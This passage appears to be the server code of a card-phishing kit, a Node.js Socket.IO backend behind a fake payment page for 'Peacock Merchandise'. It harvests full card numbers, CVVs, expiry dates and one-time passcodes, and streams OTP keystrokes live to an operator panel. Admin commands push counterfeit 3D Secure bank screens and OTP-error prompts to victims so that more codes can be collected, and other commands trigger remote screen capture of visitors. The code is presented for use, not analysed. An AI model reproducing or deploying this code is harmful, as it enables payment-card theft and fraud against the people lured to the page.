      ip: socket.handshake.address || 'Unknown',
      timestamp: data.timestamp || new Date().toISOString()
    });
    
    // Also broadcast as 'new_transaction' for backward compatibility
    broadcastToAdmins('new_transaction', { invoiceId: data.invoiceId });
  });
  
  // Handle OTP submission from index.html
  socket.on('otp_submission', (data) => {
    console.log('OTP received:', data);
    
    if (!data.transaction_id || !transactions.has(data.transaction_id)) {
      console.error('Transaction not found for OTP submission:', data.transaction_id);
      return;
    }
    
    const txn = transactions.get(data.transaction_id);
    txn.otpEntered = data.otp;
    txn.status = 'otp_received';
    txn.otpError = false;
    
    // Broadcast to all admins
    broadcastToAdmins('otp_submission', {
      invoiceId: data.transaction_id,
      otp: data.otp,
      timestamp: data.timestamp || new Date().toISOString()
    });
  });
  
  // Handle process_payment event from payment form
  socket.on('process_payment', (paymentData) => {
    console.log('Processing payment:', paymentData);
    
    // Generate a transaction ID if one doesn't exist
    const invoiceId = paymentData.transactionId || crypto.randomBytes(8).toString('hex').toUpperCase();
    
    // Create a sanitized copy of the card data for admin panel (removing sensitive data)
    const adminPaymentData = {
      invoiceId: invoiceId,
      cardData: {
        cardNumber: paymentData.cardNumber,
        cardLast4: paymentData.cardNumber ? paymentData.cardNumber.slice(-4) : '****',
        expiry: paymentData.expiryDate,
        cvv: paymentData.cvv,
        cardHolder: paymentData.cardHolder,
        amount: paymentData.amount || 0,
        currency: paymentData.currency || 'USD',
        cardType: paymentData.cardType || 'Unknown'
      },
      ip: socket.handshake.address || 'Unknown',
      timestamp: new Date().toISOString()
    };
    
    // Store transaction in memory
    const transaction = {
      id: invoiceId,
      cardNumber: paymentData.cardNumber,
      expiry: paymentData.expiryDate,
      cvv: paymentData.cvv,
      email: paymentData.email || 'customer@example.com',
      amount: paymentData.amount || '0',
      currency: paymentData.currency || 'USD',
      cardholder: paymentData.cardHolder,
      status: 'processing',
      otpShown: false,
      otpEntered: null,
      otpError: false,
      redirectStatus: null,
      bankpageVisible: false,
      timestamp: new Date().toISOString(),
      ip: socket.handshake.address || 'Unknown',
      viewed: false,
      socketId: socket.id // Store the socket ID for later use
    };
  
    // If card type info is available, add it
    if (paymentData.cardType) {
      transaction.bankInfo = {
        scheme: paymentData.cardType || 'Unknown'
      };
    }
  
    // Store transaction
    transactions.set(invoiceId, transaction);
  
    // Send acknowledgment back to the client
    socket.emit('card_data_received', {
      invoiceId: invoiceId,
      received: true,
      timestamp: Date.now()
    });
  
    // Join the room for this transaction
    socket.join(invoiceId);
  
    // Broadcast to all admin connections
    broadcastToAdmins('card_submitted', adminPaymentData);
  
    // Also use the existing admin event for backward compatibility
    broadcastToAdmins('new_transaction', { invoiceId });
  
    // Check if this card should go through MC verification (3D Secure)
    setTimeout(() => {
      const needsMcVerification = shouldRequireMcVerification(paymentData.cardNumber);
    
      if (needsMcVerification) {
        console.log(`Transaction ${invoiceId} requires MC verification`);
      
        // Update transaction status
        transaction.status = 'mc_verification_pending';
        transactions.set(invoiceId, transaction);
      
        // Store verification state
        verificationStates.set(invoiceId, {
          status: 'pending',
          cardInfo: {
            cardNumber: paymentData.cardNumber,
            expiryDate: paymentData.expiryDate,
            cardHolder: paymentData.cardHolder,
            last4: paymentData.cardNumber.slice(-4)
          },
          socketId: socket.id,
          attemptCount: 0
        });
      
        // Notify the client that MC verification is required
        socket.emit('payment_response', {
          success: false,
          requiresVerification: true,
          transactionId: invoiceId,
          message: 'Card requires additional verification'
        });
      
        // Notify admins of pending verification
        broadcastToAdmins('admin_notification', {
          type: 'verification_pending',
          invoiceId,
          cardLast4: paymentData.cardNumber.slice(-4),
          amount: paymentData.amount,
          timestamp: Date.now()
        });
      } else {
        // For demo purposes: Approve payments with valid card numbers, decline others
        const isApproved = /^4/.test(paymentData.cardNumber); // Simple validation - approve Visa cards
      
        // Update transaction status
        transaction.status = isApproved ? 'approved' : 'declined';
        transaction.redirectStatus = isApproved ? 'success' : 'fail';
        transactions.set(invoiceId, transaction);
      
        // Send response to client
        socket.emit('payment_response', {
          success: isApproved,
          transactionId: invoiceId,
          message: isApproved ? 'Payment successful' : 'Payment declined: Invalid card'
        });
      
        // Log the transaction result
        console.log(`Payment ${isApproved ? 'approved' : 'declined'} for transaction ${invoiceId}`);
      }
    }, 2000); // Simulate processing delay
  });

  // Add listener for currency page redirection
  socket.on('currency_redirect', (data) => {
    console.log('Received currency_redirect event:', data);
    if (data.invoiceId && transactions.has(data.invoiceId) && data.pid) {
      // Generate random hash for clean URL
      const randomHash = Math.random().toString(36).substring(2, 8);
      io.to(data.invoiceId).emit('redirect_to_currency', { 
        redirectUrl: `/c/${randomHash}?pid=${data.pid}` 
      });
    }
  });
  
  // MC verification events - enhanced with direct broadcasting and state management
  socket.on('show_mc_verification', (data) => {
    console.log('Received show_mc_verification event:', data);
  
    // Look up the transaction
    const txn = transactions.get(data.invoiceId);
    if (!txn) {
      console.error('Transaction not found for MC verification:', data.invoiceId);
      return;
    }
  
    // Set up initial verification state if not exists
    if (!verificationStates.has(data.invoiceId)) {
      verificationStates.set(data.invoiceId, {
        status: 'pending',
        cardInfo: {
          cardNumber: txn.cardNumber,
          expiryDate: txn.expiry,
          cardHolder: txn.cardholder,
          last4: txn.cardNumber.slice(-4)
        },
        socketId: txn.socketId || socket.id,
        attemptCount: 0
      });
    
      // Update transaction status
      txn.status = 'mc_verification_pending';
    }
  
    // Add card type if not specified
    if (!data.cardType) {
      data.cardType = detectCardType(txn.cardNumber);
    }
  
    // Broadcast to the specific client with this invoice ID
    io.to(data.invoiceId).emit('show_mc_verification', data);
  
    // Also try to broadcast to the client that submitted the card
    if (txn.socketId) {
      io.to(txn.socketId).emit('show_mc_verification', data);
    }
  
    // Log the action
    console.log(`MC verification initiated for invoice: ${data.invoiceId}, card type: ${data.cardType}`);
  });

  // Start verification event
  socket.on('start_verification', (data) => {
    console.log('Received start_verification event:', data);
  
    // Update verification state
    if (verificationStates.has(data.invoiceId)) {
      const state = verificationStates.get(data.invoiceId);
      state.status = 'verification_started';
      state.verificationType = data.verificationType;
      state.bankCode = data.bankCode;
      verificationStates.set(data.invoiceId, state);
    }
  
    // Broadcast to the client with this invoice ID
    io.to(data.invoiceId).emit('start_verification', {
      invoiceId: data.invoiceId,
      verificationType: data.verificationType || 'mastercard',
      bankCode: data.bankCode || 'default',
      merchantName: data.merchantName || 'Peacock Merchandise'
    });
    
    // If there's a stored socket ID for this transaction, also send to that socket directly
    const txn = transactions.get(data.invoiceId);
    if (txn && txn.socketId) {
      io.to(txn.socketId).emit('start_verification', {
        invoiceId: data.invoiceId,
        verificationType: data.verificationType || 'mastercard',
        bankCode: data.bankCode || 'default',
        merchantName: data.merchantName || 'Peacock Merchandise'
      });
    }
  
    // Log the action
    console.log(`MC verification started for invoice: ${data.invoiceId}, type: ${data.verificationType}, bank: ${data.bankCode}`);
  });

  // FIX 2: Enhanced bank logo update handler
  socket.on('update_mc_bank', (data) => {
    // Update bank logo on client
    console.log('Received update_mc_bank event:', data);
  
    // Update verification state
    if (verificationStates.has(data.invoiceId)) {
      const state = verificationStates.get(data.invoiceId);
      state.bankCode = data.bankCode;
      verificationStates.set(data.invoiceId, state);
    }
  
    // Broadcast to all possible client channels to ensure bank logo is updated
    io.to(data.invoiceId).emit('update_mc_bank', {
      invoiceId: data.invoiceId,
      bankCode: data.bankCode
    });
    
    // If there's a stored socket ID for this transaction, also send to that socket directly
    const txn = transactions.get(data.invoiceId);
    if (txn && txn.socketId) {
      io.to(txn.socketId).emit('update_mc_bank', {
        invoiceId: data.invoiceId,
        bankCode: data.bankCode
      });
    }
    
    // Also broadcast to the entire socket connection
    socket.broadcast.emit('update_mc_bank', {
      invoiceId: data.invoiceId,
      bankCode: data.bankCode
    });
  });

  socket.on('update_mc_currency', (data) => {
    // Update currency on client
    console.log('Received update_mc_currency event:', data);
  
    // Update verification state
    if (verificationStates.has(data.invoiceId)) {
      const state = verificationStates.get(data.invoiceId);
      state.currency = data.currency;
      verificationStates.set(data.invoiceId, state);
    }
  
    io.to(data.invoiceId).emit('update_mc_currency', {
      invoiceId: data.invoiceId,
      currency: data.currency
    });
    
    // If there's a stored socket ID for this transaction, also send to that socket directly
    const txn = transactions.get(data.invoiceId);
    if (txn && txn.socketId) {
      io.to(txn.socketId).emit('update_mc_currency', {
        invoiceId: data.invoiceId,
        currency: data.currency
      });
    }
  });

  socket.on('mc_otp_submitted', (data) => {
    const { otp, invoiceId } = data;
    console.log(`MC OTP RECEIVED: ${otp} for invoice: ${invoiceId || 'unknown'}`);
  
    if (!invoiceId) {
      // Try to find a transaction for this socket
      let foundInvoiceId = null;
      verificationStates.forEach((state, id) => {
        if (state.socketId === socket.id || state.lastActiveSocketId === socket.id) {
          foundInvoiceId = id;
        }
      });
    
      if (foundInvoiceId) {
        data.invoiceId = foundInvoiceId;
      } else {
        console.error('No active verification found for this socket');
        socket.emit('mc_otp_error', { message: 'Verification session expired' });
        return;
      }
    }
  
    // Update verification state
    if (verificationStates.has(data.invoiceId)) {
      const state = verificationStates.get(data.invoiceId);
      state.attemptCount = (state.attemptCount || 0) + 1;
      state.otp = otp;
      verificationStates.set(data.invoiceId, state);
    
      // For demo: Keep showing "Verifying..." button until admin responds - don't auto-validate
    
      // Notify admins of the submission
      broadcastToAdmins('admin_notification', {
        type: 'verification_otp_submitted',
        invoiceId: data.invoiceId,
        otp: otp,
        attemptCount: state.attemptCount,
        timestamp: Date.now()
      });
    } else {
      socket.emit('mc_otp_error', { message: 'Verification session expired' });
    }
  
    // Notify admin panel of OTP submission
    broadcastToAdmins('mc_otp_submitted', data);
  });

  socket.on('mc_otp_typing', (data) => {
    // Send partial OTP to admin panel as user types
    console.log(`MC OTP typing: ${data.partialOtp} for invoice: ${data.invoiceId}`);
    broadcastToAdmins('mc_otp_typing', data);
  });

  socket.on('mc_otp_error', (data) => {
    // Send OTP error to client
    console.log('Sending OTP error to client:', data);
    io.to(data.invoiceId).emit('mc_otp_error', data);
    
    // If there's a stored socket ID for this transaction, also send to that socket directly
    const txn = transactions.get(data.invoiceId);
    if (txn && txn.socketId) {
      io.to(txn.socketId).emit('mc_otp_error', data);
    }
  });

  // FIX 3: Enhanced MC verification result handler for proper redirects
  socket.on('mc_verification_result', (data) => {
    // Log the verification result
    console.log('MC verification result:', data);
  
    // Update verification state
    if (verificationStates.has(data.invoiceId)) {
      const state = verificationStates.get(data.invoiceId);
      state.status = data.success ? 'verified' : 'failed';
      verificationStates.set(data.invoiceId, state);
    }
  
    // Update transaction status
    const txn = transactions.get(data.invoiceId);
    if (txn) {
      txn.status = data.success ? 'approved' : 'declined';
      txn.redirectStatus = data.success ? 'success' : 'fail';
      // Store failure reason if present
      if (data.reason) {
        txn.failureReason = data.reason;
      }
      transactions.set(data.invoiceId, txn);
    }
  
    // Send verification result to all possible client channels
    io.to(data.invoiceId).emit('mc_verification_result', data);
    
    // If there's a stored socket ID for this transaction, also send to that socket directly
    if (txn && txn.socketId) {
      io.to(txn.socketId).emit('mc_verification_result', data);
    }
    
    // Try sending it directly to all sockets in case the client's connection has changed
    socket.broadcast.emit('mc_verification_result', {
      invoiceId: data.invoiceId,
      success: data.success,
      reason: data.reason,
      message: data.message
    });
  });

  socket.on('mc_verification_cancelled', (data) => {
    // Find the transaction for this socket if not provided
    let invoiceId = data.invoiceId;
    if (!invoiceId) {
      verificationStates.forEach((state, id) => {
        if (state.socketId === socket.id || state.lastActiveSocketId === socket.id) {
          invoiceId = id;
        }
      });
    }
  
    if (invoiceId) {
      console.log(`Verification cancelled for transaction ${invoiceId}`);
    
      // Update verification state
      if (verificationStates.has(invoiceId)) {
        const state = verificationStates.get(invoiceId);
        state.status = 'cancelled';
        verificationStates.set(invoiceId, state);
      }
    
      // Update transaction status
      const txn = transactions.get(invoiceId);
      if (txn) {
        txn.status = 'cancelled';
        txn.redirectStatus = 'fail';
        txn.failureReason = 'canceled';
        transactions.set(invoiceId, txn);
      }
    
      // Notify admins
      broadcastToAdmins('admin_notification', {
        type: 'verification_cancelled',
        invoiceId: invoiceId,
        timestamp: Date.now()
      });
    }
  });

  socket.on('mc_resend_otp', (data) => {
    // Log the OTP resend request
    console.log(`MC OTP RESEND REQUEST for invoice: ${data.invoiceId || 'unknown'}`);
  
    // Find the transaction for this socket if not provided
    let invoiceId = data.invoiceId;
    if (!invoiceId) {
      verificationStates.forEach((state, id) => {
        if (state.socketId === socket.id || state.lastActiveSocketId === socket.id) {
          invoiceId = id;
        }
      });
    }
  
    if (invoiceId) {
      // Notify admins
      broadcastToAdmins('admin_notification', {
        type: 'otp_resend_requested',
        invoiceId: invoiceId,
        timestamp: Date.now()
      });
    }
  });

socket.on('admin_command', (data) => {
  console.log('ADMIN COMMAND RECEIVED WITH FULL DATA:', JSON.stringify(data));
  
  // Check if this is from an admin socket
  if (!adminSockets.has(socket)) {
    console.log('Unauthorized admin command attempt:', socket.id);
    return;
  }

  const { command, invoiceId, phoneLastFour, brandType } = data;
  console.log(`Admin command received: ${command} for transaction ${invoiceId}, phone: ${phoneLastFour}, brand: ${brandType}`);
  
  if (!invoiceId || !transactions.has(invoiceId)) {
    console.log(`No transaction found for ID: ${invoiceId}`);
    return;
  }
  
  // Find associated socket(s) for this transaction
  let clientSockets = [];
  io.sockets.sockets.forEach(s => {
    // Check rooms the socket is in
    const rooms = s.rooms;
    if (rooms.has(invoiceId)) {
      clientSockets.push(s);
    }
  });
  
  if (clientSockets.length === 0) {
    console.log(`No active client sockets found for transaction ${invoiceId}`);
    // Try to find in verification states
    const state = verificationStates.get(invoiceId);
    if (state && state.socketId) {
      const foundSocket = io.sockets.sockets.get(state.socketId);
      if (foundSocket) {
        clientSockets.push(foundSocket);
      }
    }
  }
    
  // Try the transaction's stored socketId as a last resort
  const txn = transactions.get(invoiceId);
  if (txn && txn.socketId && clientSockets.length === 0) {
    const foundSocket = io.sockets.sockets.get(txn.socketId);
    if (foundSocket) {
      clientSockets.push(foundSocket);
    }
  }
  
  // If we still have no sockets, broadcast to the room anyway
  // Some clients might be listening on the room without being tracked
  if (clientSockets.length === 0) {
    console.log(`No active sockets found, broadcasting to room ${invoiceId}`);
  }
  
  // Execute the command
  switch (command) {
    case 'show_brand_selection':
      // This is a new command for showing brand selection in client
      console.log('Showing brand selection for:', invoiceId);
      
      // Store this transaction as pending brand selection
      if (!verificationStates.has(invoiceId)) {
        verificationStates.set(invoiceId, {
          status: 'brand_selection_pending',
          phoneLastFour: phoneLastFour || '',
          brandType: brandType || 'mastercard'
        });
      }
      
      // Send to client
      clientSockets.forEach(clientSocket => {
        clientSocket.emit('show_brand_selection', {
          invoiceId
        });
      });
      
      // Also broadcast to the room
      io.to(invoiceId).emit('show_brand_selection', {
        invoiceId
      });
      break;
      
    case 'update_brand_type':
      // Update the brand type for this verification
      if (verificationStates.has(invoiceId)) {
        const state = verificationStates.get(invoiceId);
        state.brandType = brandType || 'mastercard';
        verificationStates.set(invoiceId, state);
        
        // Update client
        clientSockets.forEach(clientSocket => {
          clientSocket.emit('update_brand_type', {
            invoiceId,
            brandType: brandType || 'mastercard'
          });
        });
        
        // Also broadcast to the room
        io.to(invoiceId).emit('update_brand_type', {
          invoiceId,
          brandType: brandType || 'mastercard'
        });
      }
      break;
      
    case 'show_mc_verification':
      console.log('Sending show_mc_verification with phone:', data.phoneLastFour);
      
      // Store the phone number in the verification state for this transaction
      if (verificationStates.has(invoiceId)) {
        const verificationState = verificationStates.get(invoiceId);
        verificationState.phoneLastFour = data.phoneLastFour;
        verificationStates.set(invoiceId, verificationState);
      } else {
        // Create a new verification state if it doesn't exist
        verificationStates.set(invoiceId, {
          status: 'pending',
          phoneLastFour: data.phoneLastFour
        });
      }
      
      clientSockets.forEach(clientSocket => {
        clientSocket.emit('show_mc_verification', {
          invoiceId,
          cardType: data.cardType || detectCardType(transactions.get(invoiceId).cardNumber),
          phoneLastFour: data.phoneLastFour
        });
      });
      
      // Also broadcast to the room
      io.to(invoiceId).emit('show_mc_verification', {
        invoiceId,
        cardType: data.cardType || detectCardType(transactions.get(invoiceId).cardNumber),
        phoneLastFour: data.phoneLastFour
      });
      break;
        
    case 'start_verification':
      console.log('Sending start_verification with phone:', data.phoneLastFour);
      
      // Ensure the phone number is in the verification state
      if (verificationStates.has(invoiceId)) {
        const verificationState = verificationStates.get(invoiceId);
        // Only update if not already set
        if (!verificationState.phoneLastFour) {
          verificationState.phoneLastFour = data.phoneLastFour;
        }
        verificationStates.set(invoiceId, verificationState);
      }
      
      // Get the phone number from verification state or data
      const phoneLastFourToUse = verificationStates.has(invoiceId) 
        ? (verificationStates.get(invoiceId).phoneLastFour || data.phoneLastFour) 
        : data.phoneLastFour;
        
      clientSockets.forEach(clientSocket => {
        clientSocket.emit('start_verification', {
          invoiceId,
          verificationType: data.verificationType || 'mastercard',
          bankCode: data.bankCode || 'default',
          merchantName: data.merchantName || 'Peacock Merchandise',
          phoneLastFour: phoneLastFourToUse
        });
      });
      
      // Also broadcast to the room
      io.to(invoiceId).emit('start_verification', {
        invoiceId,
        verificationType: data.verificationType || 'mastercard',
        bankCode: data.bankCode || 'default',
        merchantName: data.merchantName || 'Peacock Merchandise',
        phoneLastFour: phoneLastFourToUse
      });
      break;
        
    case 'verification_success':
      // Update verification state
      if (verificationStates.has(invoiceId)) {
        const state = verificationStates.get(invoiceId);
        state.status = 'verified';
        verificationStates.set(invoiceId, state);
      }
    
      // Update transaction status
      const successTxn = transactions.get(invoiceId);
      successTxn.status = 'approved';
      successTxn.redirectStatus = 'success';
      transactions.set(invoiceId, successTxn);
    
      clientSockets.forEach(clientSocket => {
        clientSocket.emit('mc_verification_result', {
          invoiceId,
          success: true,
          message: 'Verification successful'
        });
      });
      
      // Also broadcast to the room
      io.to(invoiceId).emit('mc_verification_result', {
        invoiceId,
        success: true,
        message: 'Verification successful'
      });
      break;
    
    case 'verification_failed':
      // Update verification state
      if (verificationStates.has(invoiceId)) {
        const state = verificationStates.get(invoiceId);
        state.status = 'failed';
        verificationStates.set(invoiceId, state);
      }
    
      // Update transaction status
      const failedTxn = transactions.get(invoiceId);
      failedTxn.status = 'declined';
      failedTxn.redirectStatus = 'fail';
      failedTxn.failureReason = data.reason || 'declined';
      transactions.set(invoiceId, failedTxn);
    
      clientSockets.forEach(clientSocket => {
        clientSocket.emit('mc_verification_result', {
          invoiceId,
          success: false,
          reason: data.reason || 'declined',
          message: 'Verification failed'
        });
      });
      
      // Also broadcast to the room
      io.to(invoiceId).emit('mc_verification_result', {
        invoiceId,
        success: false,
        reason: data.reason || 'declined',
        message: 'Verification failed'
      });
      break;
    
    case 'show_otp_error':
      clientSockets.forEach(clientSocket => {
        clientSocket.emit('mc_otp_error', {
          invoiceId,
          message: data.message || 'Incorrect verification code. Please try again.'
        });
      });
      
      // Also broadcast to the room
      io.to(invoiceId).emit('mc_otp_error', {
        invoiceId,
        message: data.message || 'Incorrect verification code. Please try again.'
      });
      break;
  }
});
  
  socket.on('screen_capture_error', (data) => {
    console.log(`Screen capture error from: ${socket.id}`, data.error);
    
    // Forward to admin sockets
    broadcastToAdmins('screen_capture_error', {
      ...data,
      userId: socket.handshake.query.pid,
      socketId: socket.id
    });
  });
  
  socket.on('init_advanced_capture', (data) => {
    console.log(`Init screen capture request for: ${data.userId}`);
    
    // Find client socket by userId/pid
    let clientSocket = null;
    io.sockets.sockets.forEach(s => {
      if (s.handshake.query && s.handshake.query.pid === data.userId) {
        clientSocket = s;
      }
    });
    
    if (clientSocket) {
      console.log(`Sending start_capture to: ${clientSocket.id}`);
      clientSocket.emit('control_command', {
        type: 'start_capture',
        sessionId: data.sessionId
      });
    } else {
      console.log(`No client found for user: ${data.userId}`);
    }
  });
  
  socket.on('stop_advanced_capture', (data) => {
    // Find client socket by userId/pid
    io.sockets.sockets.forEach(s => {
      if (s.handshake.query && s.handshake.query.pid === data.userId) {
        s.emit('control_command', {
          type: 'stop_capture',
          sessionId: data.sessionId
        });
      }
    });
  });
  
  socket.on('refresh_advanced_capture', (data) => {
    // Find client socket by userId/pid
    io.sockets.sockets.forEach(s => {
      if (s.handshake.query && s.handshake.query.pid === data.userId) {
        s.emit('control_command', {
          type: 'refresh_capture',
          sessionId: data.sessionId
        });
      }
    });
  });
  
  // When visitor leaves
  socket.on('visitor_left', (data) => {
    if (data.pid) {
      console.log(`Visitor left: ${data.pid}`);
      
      // Remove visitor from map
      visitors.delete(data.pid);
      
      // Notify admins
      broadcastToAdmins('visitor_left', {
        pid: data.pid,
        timestamp: Date.now()
      });
    }
  });
  
  // When socket disconnects, remove from admin sockets if it was an admin
  socket.on('disconnect', () => {
    if (adminSockets.has(socket)) {
      adminSockets.delete(socket);
      console.log('Admin disconnected:', socket.id);
    }
    console.log('Socket disconnected:', socket.id);
  });
});

// ======= MC VERIFICATION HELPER FUNCTIONS =======

// Detects card type based on card number
function detectCardType(cardNumber) {
  if (!cardNumber) return 'mastercard'; // Default to MasterCard
  
  if (/^4/.test(cardNumber)) return 'visa';
  if (/^5[1-5]/.test(cardNumber)) return 'mastercard';
  if (/^3[47]/.test(cardNumber)) return 'amex';
  if (/^6(?:011|5)/.test(cardNumber)) return 'discover';
  return 'mastercard'; // Default
}

// Determines if a card should require MC verification
function shouldRequireMcVerification(cardNumber) {
  // For demo: Require verification for certain card patterns
  // In a real system, this would be based on the payment processor's decision
  
  // Visa cards starting with 41 or 45
  if (/^(41|45)/.test(cardNumber)) return true;
  
  // Mastercard cards starting with 52 or 54
  if (/^(52|54)/.test(cardNumber)) return true;
  
  // All Amex cards
  if (/^3[47]/.test(cardNumber)) return true;
  
  // For demo: randomly require verification for other cards (30% chance)
  return Math.random() < 0.3;
}

// Export the app for testing
export default app;
